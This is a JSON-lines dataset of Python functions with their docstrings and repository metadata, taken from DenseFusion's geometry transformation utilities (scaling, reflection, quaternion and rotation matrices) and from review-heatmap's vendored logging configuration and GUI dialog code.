{"docstring": "\"\"\"Return matrix to scale by factor around origin in direction.\n\nUse factor -1 for point symmetry.\n\n>>> v = (numpy.random.rand(4, 5) - 0.5) * 20\n>>> v[3] = 1\n>>> S = scale_matrix(-1.234)\n>>> numpy.allclose(numpy.dot(S, v)[:3], -1.234*v[:3])\nTrue\n>>> factor = random.random() * 10 - 5\n>>> origin = numpy.random.random(3) - 0.5\n>>> direct = numpy.random.random(3) - 0.5\n>>> S = scale_matrix(factor, origin)\n>>> S = scale_matrix(factor, origin, direct)\n\n\"\"\"\n", "func_signal": "def scale_matrix(factor, origin=None, direction=None):\n", "code": "if direction is None:\n    # uniform scaling\n    M = numpy.diag([factor, factor, factor, 1.0])\n    if origin is not None:\n        M[:3, 3] = origin[:3]\n        M[:3, 3] *= 1.0 - factor\nelse:\n    # nonuniform scaling\n    direction = unit_vector(direction[:3])\n    factor = 1.0 - factor\n    M = numpy.identity(4)\n    M[:3, :3] -= factor * numpy.outer(direction, direction)\n    if origin is not None:\n        M[:3, 3] = (factor * numpy.dot(origin[:3], direction)) * direction\nreturn M", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return matrix to mirror at plane defined by point and normal vector.\n\n>>> v0 = numpy.random.random(4) - 0.5\n>>> v0[3] = 1.\n>>> v1 = numpy.random.random(3) - 0.5\n>>> R = reflection_matrix(v0, v1)\n>>> numpy.allclose(2, numpy.trace(R))\nTrue\n>>> numpy.allclose(v0, numpy.dot(R, v0))\nTrue\n>>> v2 = v0.copy()\n>>> v2[:3] += v1\n>>> v3 = v0.copy()\n>>> v2[:3] -= v1\n>>> numpy.allclose(v2, numpy.dot(R, v3))\nTrue\n\n\"\"\"\n", "func_signal": "def reflection_matrix(point, normal):\n", "code": "normal = unit_vector(normal[:3])\nM = numpy.identity(4)\nM[:3, :3] -= 2.0 * numpy.outer(normal, normal)\nM[:3, 3] = (2.0 * numpy.dot(point[:3], normal)) * normal\nreturn M", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return spherical linear interpolation between two quaternions.\n\n>>> q0 = random_quaternion()\n>>> q1 = random_quaternion()\n>>> q = quaternion_slerp(q0, q1, 0)\n>>> numpy.allclose(q, q0)\nTrue\n>>> q = quaternion_slerp(q0, q1, 1, 1)\n>>> numpy.allclose(q, q1)\nTrue\n>>> q = quaternion_slerp(q0, q1, 0.5)\n>>> angle = math.acos(numpy.dot(q0, q))\n>>> numpy.allclose(2, math.acos(numpy.dot(q0, q1)) / angle) or \\\n    numpy.allclose(2, math.acos(-numpy.dot(q0, q1)) / angle)\nTrue\n\n\"\"\"\n", "func_signal": "def quaternion_slerp(quat0, quat1, fraction, spin=0, shortestpath=True):\n", "code": "q0 = unit_vector(quat0[:4])\nq1 = unit_vector(quat1[:4])\nif fraction == 0.0:\n    return q0\nelif fraction == 1.0:\n    return q1\nd = numpy.dot(q0, q1)\nif abs(abs(d) - 1.0) < _EPS:\n    return q0\nif shortestpath and d < 0.0:\n    # invert rotation\n    d = -d\n    numpy.negative(q1, q1)\nangle = math.acos(d) + spin * math.pi\nif abs(angle) < _EPS:\n    return q0\nisin = 1.0 / math.sin(angle)\nq0 *= math.sin((1.0 - fraction) * angle) * isin\nq1 *= math.sin(fraction * angle) * isin\nq0 += q1\nreturn q0", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return quaternion from Euler angles and axis sequence.\n\nai, aj, ak : Euler's roll, pitch and yaw angles\naxes : One of 24 axis sequences as string or encoded tuple\n\n>>> q = quaternion_from_euler(1, 2, 3, 'ryxz')\n>>> numpy.allclose(q, [0.435953, 0.310622, -0.718287, 0.444435])\nTrue\n\n\"\"\"\n", "func_signal": "def quaternion_from_euler(ai, aj, ak, axes='sxyz'):\n", "code": "try:\n    firstaxis, parity, repetition, frame = _AXES2TUPLE[axes.lower()]\nexcept (AttributeError, KeyError):\n    _TUPLE2AXES[axes]  # validation\n    firstaxis, parity, repetition, frame = axes\n\ni = firstaxis + 1\nj = _NEXT_AXIS[i+parity-1] + 1\nk = _NEXT_AXIS[i-parity] + 1\n\nif frame:\n    ai, ak = ak, ai\nif parity:\n    aj = -aj\n\nai /= 2.0\naj /= 2.0\nak /= 2.0\nci = math.cos(ai)\nsi = math.sin(ai)\ncj = math.cos(aj)\nsj = math.sin(aj)\nck = math.cos(ak)\nsk = math.sin(ak)\ncc = ci*ck\ncs = ci*sk\nsc = si*ck\nss = si*sk\n\nq = numpy.empty((4, ))\nif repetition:\n    q[0] = cj*(cc - ss)\n    q[i] = cj*(cs + sc)\n    q[j] = sj*(cc + ss)\n    q[k] = sj*(cs - sc)\nelse:\n    q[0] = cj*cc + sj*ss\n    q[i] = cj*sc - sj*cs\n    q[j] = cj*ss + sj*cc\n    q[k] = cj*cs - sj*sc\nif parity:\n    q[j] *= -1.0\n\nreturn q", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return inverse of quaternion.\n\n>>> q0 = random_quaternion()\n>>> q1 = quaternion_inverse(q0)\n>>> numpy.allclose(quaternion_multiply(q0, q1), [1, 0, 0, 0])\nTrue\n\n\"\"\"\n", "func_signal": "def quaternion_inverse(quaternion):\n", "code": "q = numpy.array(quaternion, dtype=numpy.float64, copy=True)\nnumpy.negative(q[1:], q[1:])\nreturn q / numpy.dot(q, q)", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return rotation angle and axis from rotation matrix.\n\n>>> angle = (random.random() - 0.5) * (2*math.pi)\n>>> direc = numpy.random.random(3) - 0.5\n>>> point = numpy.random.random(3) - 0.5\n>>> R0 = rotation_matrix(angle, direc, point)\n>>> angle, direc, point = rotation_from_matrix(R0)\n>>> R1 = rotation_matrix(angle, direc, point)\n>>> is_same_transform(R0, R1)\nTrue\n\n\"\"\"\n", "func_signal": "def rotation_from_matrix(matrix):\n", "code": "R = numpy.array(matrix, dtype=numpy.float64, copy=False)\nR33 = R[:3, :3]\n# direction: unit eigenvector of R33 corresponding to eigenvalue of 1\nw, W = numpy.linalg.eig(R33.T)\ni = numpy.where(abs(numpy.real(w) - 1.0) < 1e-8)[0]\nif not len(i):\n    raise ValueError('no unit eigenvector corresponding to eigenvalue 1')\ndirection = numpy.real(W[:, i[-1]]).squeeze()\n# point: unit eigenvector of R33 corresponding to eigenvalue of 1\nw, Q = numpy.linalg.eig(R)\ni = numpy.where(abs(numpy.real(w) - 1.0) < 1e-8)[0]\nif not len(i):\n    raise ValueError('no unit eigenvector corresponding to eigenvalue 1')\npoint = numpy.real(Q[:, i[-1]]).squeeze()\npoint /= point[3]\n# rotation angle depending on direction\ncosa = (numpy.trace(R33) - 1.0) / 2.0\nif abs(direction[2]) > 1e-8:\n    sina = (R[1, 0] + (cosa-1.0)*direction[0]*direction[1]) / direction[2]\nelif abs(direction[1]) > 1e-8:\n    sina = (R[0, 2] + (cosa-1.0)*direction[0]*direction[2]) / direction[1]\nelse:\n    sina = (R[2, 1] + (cosa-1.0)*direction[1]*direction[2]) / direction[0]\nangle = math.atan2(sina, cosa)\nreturn angle, direction, point", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return orthogonalization matrix for crystallographic cell coordinates.\n\nAngles are expected in degrees.\n\nThe de-orthogonalization matrix is the inverse.\n\n>>> O = orthogonalization_matrix([10, 10, 10], [90, 90, 90])\n>>> numpy.allclose(O[:3, :3], numpy.identity(3, float) * 10)\nTrue\n>>> O = orthogonalization_matrix([9.8, 12.0, 15.5], [87.2, 80.7, 69.7])\n>>> numpy.allclose(numpy.sum(O), 43.063229)\nTrue\n\n\"\"\"\n", "func_signal": "def orthogonalization_matrix(lengths, angles):\n", "code": "a, b, c = lengths\nangles = numpy.radians(angles)\nsina, sinb, _ = numpy.sin(angles)\ncosa, cosb, cosg = numpy.cos(angles)\nco = (cosa * cosb - cosg) / (sina * sinb)\nreturn numpy.array([\n    [ a*sinb*math.sqrt(1.0-co*co),  0.0,    0.0, 0.0],\n    [-a*sinb*co,                    b*sina, 0.0, 0.0],\n    [ a*cosb,                       b*cosa, c,   0.0],\n    [ 0.0,                          0.0,    0.0, 1.0]])", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Return concatenation of series of transformation matrices.\n\n>>> M = numpy.random.rand(16).reshape((4, 4)) - 0.5\n>>> numpy.allclose(M, concatenate_matrices(M))\nTrue\n>>> numpy.allclose(numpy.dot(M, M.T), concatenate_matrices(M, M.T))\nTrue\n\n\"\"\"\n", "func_signal": "def concatenate_matrices(*matrices):\n", "code": "M = numpy.identity(4)\nfor i in matrices:\n    M = numpy.dot(M, i)\nreturn M", "path": "DenseFusion/lib/transformations.py", "commit_date": "2019-01-11 00:00:00", "repo_name": "j96w/DenseFusion", "stars": 1027, "license": "mit", "language": "python", "size": 5129}
{"docstring": "\"\"\"Clear and close existing handlers\"\"\"\n", "func_signal": "def _clearExistingHandlers():\n", "code": "logging._handlers.clear()\nlogging.shutdown(logging._handlerList[:])\ndel logging._handlerList[:]", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"\nResolve strings to objects using standard import and attribute\nsyntax.\n\"\"\"\n", "func_signal": "def resolve(self, s):\n", "code": "name = s.split('.')\nused = name.pop(0)\ntry:\n    found = self.importer(used)\n    for frag in name:\n        used += '.' + frag\n        try:\n            found = getattr(found, frag)\n        except AttributeError:\n            self.importer(used)\n            found = getattr(found, frag)\n    return found\nexcept ImportError:\n    e, tb = sys.exc_info()[1:]\n    v = ValueError('Cannot resolve %r: %s' % (s, e))\n    v.__cause__, v.__traceback__ = e, tb\n    raise v", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Configure a non-root logger from a dictionary.\"\"\"\n", "func_signal": "def configure_logger(self, name, config, incremental=False):\n", "code": "logger = logging.getLogger(name)\nself.common_logger_config(logger, config, incremental)\npropagate = config.get('propagate', None)\nif propagate is not None:\n    logger.propagate = propagate", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Configure a filter from a dictionary.\"\"\"\n", "func_signal": "def configure_filter(self, config):\n", "code": "if '()' in config:\n    result = self.configure_custom(config)\nelse:\n    name = config.get('name', '')\n    result = logging.Filter(name)\nreturn result", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"\nGet widget state/value and translate it to valid\nconfig value, optionally pre-processing it using defined\ngetter method\n\nArguments:\n    property_dict {dict} -- Dictionary describing widget <-> config\n                         mappping\n    widget_val {object} -- Current widget value\n\nReturns:\n    tuple  -- tuple of data_path {tuple} and data_val {object}\n\"\"\"\n", "func_signal": "def _widgetToDataVal(self, data, property_dict, widget_val, data_path):\n", "code": "getter_name = property_dict.get(\"getter\", None)\ngetter = getattr(self, getter_name, None) if getter_name else None\n\nif getter:\n    data_val = getter(widget_val)\nelse:\n    data_val = widget_val\n\nsetNestedValue(data, data_path, data_val)", "path": "review-heatmap/src/review_heatmap/libaddon/gui/basic/dialog_mapped.py", "commit_date": "2019-08-10 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Do the configuration.\"\"\"\n\n", "func_signal": "def configure(self):\n", "code": "config = self.config\nif 'version' not in config:\n    raise ValueError(\"dictionary doesn't specify a version\")\nif config['version'] != 1:\n    raise ValueError(\"Unsupported version: %s\" % config['version'])\nincremental = config.pop('incremental', False)\nEMPTY_DICT = {}\nlogging._acquireLock()\ntry:\n    if incremental:\n        handlers = config.get('handlers', EMPTY_DICT)\n        for name in handlers:\n            if name not in logging._handlers:\n                raise ValueError('No handler found with '\n                                 'name %r'  % name)\n            else:\n                try:\n                    handler = logging._handlers[name]\n                    handler_config = handlers[name]\n                    level = handler_config.get('level', None)\n                    if level:\n                        handler.setLevel(logging._checkLevel(level))\n                except Exception as e:\n                    raise ValueError('Unable to configure handler '\n                                     '%r: %s' % (name, e))\n        loggers = config.get('loggers', EMPTY_DICT)\n        for name in loggers:\n            try:\n                self.configure_logger(name, loggers[name], True)\n            except Exception as e:\n                raise ValueError('Unable to configure logger '\n                                 '%r: %s' % (name, e))\n        root = config.get('root', None)\n        if root:\n            try:\n                self.configure_root(root, True)\n            except Exception as e:\n                raise ValueError('Unable to configure root '\n                                 'logger: %s' % e)\n    else:\n        disable_existing = config.pop('disable_existing_loggers', True)\n\n        _clearExistingHandlers()\n\n        # Do formatters first - they don't refer to anything else\n        formatters = config.get('formatters', EMPTY_DICT)\n        for name in formatters:\n            try:\n                formatters[name] = self.configure_formatter(\n                                                    formatters[name])\n            except Exception as e:\n                raise ValueError('Unable to configure '\n                                 'formatter %r: %s' % (name, e))\n        # Next, do filters - they don't refer to anything else, either\n        filters = config.get('filters', EMPTY_DICT)\n        for name in filters:\n            try:\n                filters[name] = self.configure_filter(filters[name])\n            except Exception as e:\n                raise ValueError('Unable to configure '\n                                 'filter %r: %s' % (name, e))\n\n        # Next, do handlers - they refer to formatters and filters\n        # As handlers can refer to other handlers, sort the keys\n        # to allow a deterministic order of configuration\n        handlers = config.get('handlers', EMPTY_DICT)\n        deferred = []\n        for name in sorted(handlers):\n            try:\n                handler = self.configure_handler(handlers[name])\n                handler.name = name\n                handlers[name] = handler\n            except Exception as e:\n                if 'target not configured yet' in str(e):\n                    deferred.append(name)\n                else:\n                    raise ValueError('Unable to configure handler '\n                                     '%r: %s' % (name, e))\n\n        # Now do any that were deferred\n        for name in deferred:\n            try:\n                handler = self.configure_handler(handlers[name])\n                handler.name = name\n                handlers[name] = handler\n            except Exception as e:\n                raise ValueError('Unable to configure handler '\n                                 '%r: %s' % (name, e))\n\n        # Next, do loggers - they refer to handlers and filters\n\n        #we don't want to lose the existing loggers,\n        #since other threads may have pointers to them.\n        #existing is set to contain all existing loggers,\n        #and as we go through the new configuration we\n        #remove any which are configured. At the end,\n        #what's left in existing is the set of loggers\n        #which were in the previous configuration but\n        #which are not in the new configuration.\n        root = logging.root\n        existing = list(root.manager.loggerDict.keys())\n        #The list needs to be sorted so that we can\n        #avoid disabling child loggers of explicitly\n        #named loggers. With a sorted list it is easier\n        #to find the child loggers.\n        existing.sort()\n        #We'll keep the list of existing loggers\n        #which are children of named loggers here...\n        child_loggers = []\n        #now set up the new ones...\n        loggers = config.get('loggers', EMPTY_DICT)\n        for name in loggers:\n            if name in existing:\n                i = existing.index(name) + 1 # look after name\n                prefixed = name + \".\"\n                pflen = len(prefixed)\n                num_existing = len(existing)\n                while i < num_existing:\n                    if existing[i][:pflen] == prefixed:\n                        child_loggers.append(existing[i])\n                    i += 1\n                existing.remove(name)\n            try:\n                self.configure_logger(name, loggers[name])\n            except Exception as e:\n                raise ValueError('Unable to configure logger '\n                                 '%r: %s' % (name, e))\n\n        #Disable any old loggers. There's no point deleting\n        #them as other threads may continue to hold references\n        #and by disabling them, you stop them doing any logging.\n        #However, don't disable children of named loggers, as that's\n        #probably not what was intended by the user.\n        #for log in existing:\n        #    logger = root.manager.loggerDict[log]\n        #    if log in child_loggers:\n        #        logger.level = logging.NOTSET\n        #        logger.handlers = []\n        #        logger.propagate = True\n        #    elif disable_existing:\n        #        logger.disabled = True\n        _handle_existing_loggers(existing, child_loggers,\n                                 disable_existing)\n\n        # And finally, do the root logger\n        root = config.get('root', None)\n        if root:\n            try:\n                self.configure_root(root)\n            except Exception as e:\n                raise ValueError('Unable to configure root '\n                                 'logger: %s' % e)\nfinally:\n    logging._releaseLock()", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"\nStart up a socket server on the specified port, and listen for new\nconfigurations.\n\nThese will be sent as a file suitable for processing by fileConfig().\nReturns a Thread object on which you can call start() to start the server,\nand which you can join() when appropriate. To stop the server, call\nstopListening().\n\nUse the ``verify`` argument to verify any bytes received across the wire\nfrom a client. If specified, it should be a callable which receives a\nsingle argument - the bytes of configuration data received across the\nnetwork - and it should return either ``None``, to indicate that the\npassed in bytes could not be verified and should be discarded, or a\nbyte string which is then passed to the configuration machinery as\nnormal. Note that you can return transformed bytes, e.g. by decrypting\nthe bytes passed in.\n\"\"\"\n", "func_signal": "def listen(port=DEFAULT_LOGGING_CONFIG_PORT, verify=None):\n", "code": "if not thread: #pragma: no cover\n    raise NotImplementedError(\"listen() needs threading to work\")\n\nclass ConfigStreamHandler(StreamRequestHandler):\n    \"\"\"\n    Handler for a logging configuration request.\n\n    It expects a completely new logging configuration and uses fileConfig\n    to install it.\n    \"\"\"\n    def handle(self):\n        \"\"\"\n        Handle a request.\n\n        Each request is expected to be a 4-byte length, packed using\n        struct.pack(\">L\", n), followed by the config file.\n        Uses fileConfig() to do the grunt work.\n        \"\"\"\n        try:\n            conn = self.connection\n            chunk = conn.recv(4)\n            if len(chunk) == 4:\n                slen = struct.unpack(\">L\", chunk)[0]\n                chunk = self.connection.recv(slen)\n                while len(chunk) < slen:\n                    chunk = chunk + conn.recv(slen - len(chunk))\n                if self.server.verify is not None:\n                    chunk = self.server.verify(chunk)\n                if chunk is not None:   # verified, can process\n                    chunk = chunk.decode(\"utf-8\")\n                    try:\n                        import json\n                        d =json.loads(chunk)\n                        assert isinstance(d, dict)\n                        dictConfig(d)\n                    except Exception:\n                        #Apply new configuration.\n\n                        file = io.StringIO(chunk)\n                        try:\n                            fileConfig(file)\n                        except Exception:\n                            traceback.print_exc()\n                if self.server.ready:\n                    self.server.ready.set()\n        except OSError as e:\n            if e.errno != RESET_ERROR:\n                raise\n\nclass ConfigSocketReceiver(ThreadingTCPServer):\n    \"\"\"\n    A simple TCP socket-based logging config receiver.\n    \"\"\"\n\n    allow_reuse_address = 1\n\n    def __init__(self, host='localhost', port=DEFAULT_LOGGING_CONFIG_PORT,\n                 handler=None, ready=None, verify=None):\n        ThreadingTCPServer.__init__(self, (host, port), handler)\n        logging._acquireLock()\n        self.abort = 0\n        logging._releaseLock()\n        self.timeout = 1\n        self.ready = ready\n        self.verify = verify\n\n    def serve_until_stopped(self):\n        import select\n        abort = 0\n        while not abort:\n            rd, wr, ex = select.select([self.socket.fileno()],\n                                       [], [],\n                                       self.timeout)\n            if rd:\n                self.handle_request()\n            logging._acquireLock()\n            abort = self.abort\n            logging._releaseLock()\n        self.socket.close()\n\nclass Server(threading.Thread):\n\n    def __init__(self, rcvr, hdlr, port, verify):\n        super(Server, self).__init__()\n        self.rcvr = rcvr\n        self.hdlr = hdlr\n        self.port = port\n        self.verify = verify\n        self.ready = threading.Event()\n\n    def run(self):\n        server = self.rcvr(port=self.port, handler=self.hdlr,\n                           ready=self.ready,\n                           verify=self.verify)\n        if self.port == 0:\n            self.port = server.server_address[1]\n        self.ready.set()\n        global _listener\n        logging._acquireLock()\n        _listener = server\n        logging._releaseLock()\n        server.serve_until_stopped()\n\nreturn Server(ConfigSocketReceiver, ConfigStreamHandler, port, verify)", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Utility function which converts lists to tuples.\"\"\"\n", "func_signal": "def as_tuple(self, value):\n", "code": "if isinstance(value, list):\n    value = tuple(value)\nreturn value", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"\nGet value from config and translate it to valid widget\nvalue, optionally pre-processing it using defined\nsetter method\n\nArguments:\n    data {dict} -- Dictionary of user config values\n    property_dict {dict} -- Dictionary describing widget <-> config\n                         mappping\n\nReturns:\n    object -- Valid value for widget\n\"\"\"\n", "func_signal": "def _dataToWidgetVal(self, data, property_dict):\n", "code": "data_path = self._dataPathToList(\n    property_dict.get(\"dataPath\", \"\"))\nsetter_name = property_dict.get(\"setter\", \"\")\nsetter = getattr(self, setter_name, None) if setter_name else None\ndata_val = getNestedValue(data, data_path) if data_path else None\n\nif setter is not None:\n    widget_val = setter(data_val)\nelse:\n    widget_val = data_val\n\nreturn widget_val", "path": "review-heatmap/src/review_heatmap/libaddon/gui/basic/dialog_mapped.py", "commit_date": "2019-08-10 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"\nConvert values to an appropriate type. dicts, lists and tuples are\nreplaced by their converting alternatives. Strings are checked to\nsee if they have a conversion format and are converted if they do.\n\"\"\"\n", "func_signal": "def convert(self, value):\n", "code": "if not isinstance(value, ConvertingDict) and isinstance(value, dict):\n    value = ConvertingDict(value)\n    value.configurator = self\nelif not isinstance(value, ConvertingList) and isinstance(value, list):\n    value = ConvertingList(value)\n    value.configurator = self\nelif not isinstance(value, ConvertingTuple) and\\\n         isinstance(value, tuple):\n    value = ConvertingTuple(value)\n    value.configurator = self\nelif isinstance(value, str): # str for py3k\n    m = self.CONVERT_PATTERN.match(value)\n    if m:\n        d = m.groupdict()\n        prefix = d['prefix']\n        converter = self.value_converters.get(prefix, None)\n        if converter:\n            suffix = d['suffix']\n            converter = getattr(self, converter)\n            value = converter(suffix)\nreturn value", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Configure an object with a user-supplied factory.\"\"\"\n", "func_signal": "def configure_custom(self, config):\n", "code": "c = config.pop('()')\nif not callable(c):\n    c = self.resolve(c)\nprops = config.pop('.', None)\n# Check for valid identifiers\nkwargs = dict([(k, config[k]) for k in config if valid_ident(k)])\nresult = c(**kwargs)\nif props:\n    for name, value in props.items():\n        setattr(result, name, value)\nreturn result", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Add filters to a filterer from a list of names.\"\"\"\n", "func_signal": "def add_filters(self, filterer, filters):\n", "code": "for f in filters:\n    try:\n        filterer.addFilter(self.config['filters'][f])\n    except Exception as e:\n        raise ValueError('Unable to add filter %r: %s' % (f, e))", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Create and return formatters\"\"\"\n", "func_signal": "def _create_formatters(cp):\n", "code": "flist = cp[\"formatters\"][\"keys\"]\nif not len(flist):\n    return {}\nflist = flist.split(\",\")\nflist = _strip_spaces(flist)\nformatters = {}\nfor form in flist:\n    sectname = \"formatter_%s\" % form\n    fs = cp.get(sectname, \"format\", raw=True, fallback=None)\n    dfs = cp.get(sectname, \"datefmt\", raw=True, fallback=None)\n    stl = cp.get(sectname, \"style\", raw=True, fallback='%')\n    c = logging.Formatter\n    class_name = cp[sectname].get(\"class\")\n    if class_name:\n        c = _resolve(class_name)\n    f = c(fs, dfs, stl)\n    formatters[form] = f\nreturn formatters", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Configure a root logger from a dictionary.\"\"\"\n", "func_signal": "def configure_root(self, config, incremental=False):\n", "code": "root = logging.getLogger()\nself.common_logger_config(root, config, incremental)", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"\nPerform configuration which is common to root and non-root loggers.\n\"\"\"\n", "func_signal": "def common_logger_config(self, logger, config, incremental=False):\n", "code": "level = config.get('level', None)\nif level is not None:\n    logger.setLevel(logging._checkLevel(level))\nif not incremental:\n    #Remove any existing handlers\n    for h in logger.handlers[:]:\n        logger.removeHandler(h)\n    handlers = config.get('handlers', None)\n    if handlers:\n        self.add_handlers(logger, handlers)\n    filters = config.get('filters', None)\n    if filters:\n        self.add_filters(logger, filters)", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"\nStop the listening server which was created with a call to listen().\n\"\"\"\n", "func_signal": "def stopListening():\n", "code": "global _listener\nlogging._acquireLock()\ntry:\n    if _listener:\n        _listener.abort = 1\n        _listener = None\nfinally:\n    logging._releaseLock()", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"\nWhen (re)configuring logging, handle loggers which were in the previous\nconfiguration but are not in the new configuration. There's no point\ndeleting them as other threads may continue to hold references to them;\nand by disabling them, you stop them doing any logging.\n\nHowever, don't disable children of named loggers, as that's probably not\nwhat was intended by the user. Also, allow existing loggers to NOT be\ndisabled if disable_existing is false.\n\"\"\"\n", "func_signal": "def _handle_existing_loggers(existing, child_loggers, disable_existing):\n", "code": "root = logging.root\nfor log in existing:\n    logger = root.manager.loggerDict[log]\n    if log in child_loggers:\n        logger.level = logging.NOTSET\n        logger.handlers = []\n        logger.propagate = True\n    else:\n        logger.disabled = disable_existing", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Configure a formatter from a dictionary.\"\"\"\n", "func_signal": "def configure_formatter(self, config):\n", "code": "if '()' in config:\n    factory = config['()'] # for use in exception handler\n    try:\n        result = self.configure_custom(config)\n    except TypeError as te:\n        if \"'format'\" not in str(te):\n            raise\n        #Name of parameter changed from fmt to format.\n        #Retry with old name.\n        #This is so that code can be used with older Python versions\n        #(e.g. by Django)\n        config['fmt'] = config.pop('format')\n        config['()'] = factory\n        result = self.configure_custom(config)\nelse:\n    fmt = config.get('format', None)\n    dfmt = config.get('datefmt', None)\n    style = config.get('style', '%')\n    cname = config.get('class', None)\n    if not cname:\n        c = logging.Formatter\n    else:\n        c = _resolve(cname)\n    result = c(fmt, dfmt, style)\nreturn result", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
{"docstring": "\"\"\"Resolve a dotted name to a global object.\"\"\"\n", "func_signal": "def _resolve(name):\n", "code": "name = name.split('.')\nused = name.pop(0)\nfound = __import__(used)\nfor n in name:\n    used = used + '.' + n\n    try:\n        found = getattr(found, n)\n    except AttributeError:\n        __import__(used)\n        found = getattr(found, n)\nreturn found", "path": "review-heatmap/src/review_heatmap/libaddon/_vendor/logging/config.py", "commit_date": "2020-03-06 00:00:00", "repo_name": "glutanimate/review-heatmap", "stars": 1168, "license": "other", "language": "python", "size": 1197}
